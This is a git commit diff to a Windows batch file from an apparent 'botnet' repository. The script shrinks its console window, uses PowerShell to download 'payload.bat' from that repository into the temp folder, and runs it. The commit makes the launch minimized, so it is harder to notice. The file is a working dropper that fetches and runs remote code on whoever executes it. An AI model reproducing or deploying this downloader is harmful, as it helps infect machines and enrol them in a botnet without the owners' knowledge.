58c4144b3a6c0332fb228b11a709f3fe757052e8
H1i_sillyxploiter <129692077+unfunnylaugh@users.noreply.github.com>
2024-02-27 13:15:07 -0300

    Update code.bat

--- code.bat
+++ code.bat
@@ -1,7 +1,7 @@
 @echo off
 mode con: cols=20 lines=1
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/unfunnylaugh/botnet/main/payload.bat', '%temp%/payload.bat')"
-start %temp%\payload.bat
+start /min %temp%\payload.bat
 
 timeout /t 1 /nobreak >nul
 ::del %temp%\payload.bat
